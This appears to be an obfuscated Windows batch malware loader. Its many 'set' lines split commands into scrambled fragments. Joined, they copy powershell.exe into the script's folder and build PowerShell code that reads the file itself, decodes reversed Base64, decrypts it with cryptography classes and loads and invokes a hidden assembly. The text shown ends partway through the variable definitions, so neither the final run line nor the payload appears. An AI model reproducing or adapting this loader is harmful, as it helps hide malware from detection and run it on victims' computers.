@echo off
set "yflDjSLIkd=we"
set "lOzAgZNvhm=ws"
set "PxWBDaGEcB=xe"
set "hBhtiZBOhn=do"
set "tGtaVsWOTM=ll"
set "AoqVMphkMi=Wi"
set "QZzCuLCLxt=ll"
set "EOGuuVVTsV=y "
set "fzmOLQeuOp=co"
set "TzlOcMqSSv=we"
set "DRWLFQvVVj=32"
set "LkJuwaXWKg=in"
set "KWoBjgFkQS= C"
set "yhscEklMIq=0\"
set "ZuxIabfuXL=Sy"
set "HYnQrrKOcu=1."
set "yxzGBHmscZ=he"
set "yugIntdBKv=py"
set "yCCFoGrIZn=.e"
set "uZLVOsYdub=po"
set "IVCLcKkiXV=\v"
set "kTEVltSiNl=ow"
set "nxlbuLyvrn=\W"
set "xYxBYTUEmE=em"
set "FtGkJvvHhD= /"
set "efCXVbjeso=:\"
set "bOIdVBDAhS=rs"
set "jYivUvFtOT=s\"
set "nBPxLIoizQ=he"
set "QyzNeHKuJt=st"
set "SdahajlLFE=nd"
set "uymZTsiCoF=Po"
set "jKodcXLjox=rS"
set "zoFvWCnQHA= %~dp0"
set "fEgfdeqihH=cd"
set "bZWztwTKRp=Obje"
set "jUQoXRQscK=df ="
set "xusLWXSzgK=esaB"
set "wkVMANPyFM=]::N"
set "iPiEChouaC=stem"
set "mjvZMjUFVh=oMCY"
set "nEwKZAFMQj=S46e"
set "JMoxMgBOdm=l = "
set "AXCkDTsIwD=QWEQ"
set "pZEJcnuXIs=$tzk"
set "yosrfGPJOU=rt]:"
set "bkWBPkqTcF=k; }"
set "uXARwkGWLQ==');"
set "plsbsmNWan=sN.T"
set "JXLgBphrsq=iron"
set "MmWLDRzVvK=BC;$"
set "zSdXsEmqyN=rans"
set "ORqvrXJnQN=pher"
set "zbuBpxaWJI=nage"
set "EAGsjZgGJq= '')"
set "UfGMGmecYY=tryP"
set "JZjgGOrHbo=comm"
set "GzisbzkAjJ=ode]"
set "OXnoCUXdiN=$tbz"
set "CYyQTfthFv=y.Pa"
set "bsztiRnHcf=a = "
set "HVmtdpdZwz=bzMT"
set "cqXxWRvSPJ=bzMT"
set "IOxTuGWQAg= = $"
set "UIxdFZYYYz=[]] "
set "jlzjSyvffD=OJO "
set "TUjGZjFLjh=KnTZ"
set "ksdiJSLBko='gni"
set "GEvnQNGppj=ke($"
set "dtWSSprJZJ=pose"
set "LDRkAnnnph=ion."
set "gYhQxUIged=ring"
set "FUhDnUULXY=ZYYc"
set "YGqulBcrWg=Secu"
set "knwLNAQoQg=-joi"
set "zqWDXHZCDY=n ''"
set "YxOfaZxCPM=embl"
set "nRKHDCNzbv=::('"
set "BCGvLbItoX=F'[-"
set "xhZlSGoYpn=Obje"
set "qOqRYZfzZm=nirt"
set "TpAvdeDiNR=QWEQ"
set "igvneFdgFJ=.Cre"
set "kthAhXtAzD=-ep "
set "UVMBvgOxkL=WEQa"
set "LIlEjeJbsJ=O.Su"
set "glLQpPJZTb=ptog"
set "TvNAPizGcq=tsWi"
set "gOqKnBUTjp=le  "
set "gMLdphLFdD=.Sec"
set "cxLDmBjeTk=e = "
set "uEKVwQzLni='[-1"
set "ndscMkXUKm=();$"
set "xJgKmkpMnn=.Dis"
set "SxUSbAEEZv=ne);"
set "OklyfxsyVQ=m.Re"
set "laPGjfcAhU=);$t"
set "NvwNheeBfQ=:('g"
set "iszaHgLVvm=;$Kn"
set "XIDbxnPBUb=TZB "
set "ZRxZJAxHyM=oMCY"
set "QQZQelxeeb=('%~f0'"
set "WqlAVlTNhA=ksN "
set "SsZolbfNnP=$FJf"
set "aGDagsltcW=New-"
set "dweZoFMjKb=fHb."
set "noHYYDLRJF=('da"
set "MfjhijLoEc=in $"
set "ysICJWOkoZ=]::("
set "ucIyEVOcXK=]::("
set "SoREqfNsgD=tbzM"
set "jYoGFpjCNQ=e) {"
set "DXIuXDZvyb=0O+g"
set "FgsUxxSrIl= '')"
set "PAsjaiqcjU=oryS"
set "OYeVQiOERJ=em.C"
set "PYEkIDEmjK=am;$"
